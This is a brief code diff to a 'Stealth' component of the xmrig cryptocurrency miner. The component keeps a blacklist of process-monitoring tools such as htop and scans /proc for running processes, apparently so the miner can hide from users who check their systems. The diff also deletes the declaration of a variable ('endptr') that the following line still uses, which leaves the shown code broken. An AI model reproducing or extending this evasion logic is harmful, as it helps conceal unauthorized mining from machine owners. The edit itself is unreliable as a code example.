@@ -9,7 +9,7 @@ namespace xmrig {
 
 Stealth::Stealth(Controller *controller) :
     m_controller(controller),
-    m_thread(new Thread("Stealth"))
+    m_thread(new Thread<Stealth>("Stealth"))
 {
     m_blacklist = {
         "htop",
@@ -54,7 +54,6 @@ void Stealth::checkProcesses()
     struct dirent *entry;
     while ((entry = readdir(dir)) != nullptr) {
         if (entry->d_type == DT_DIR) {
-            char *endptr;
             long pid = strtol(entry->d_name, &endptr, 10);
             if (*endptr == '\0') {
                 std::string commPath = std::string("/proc/") + entry->d_name + "/comm";
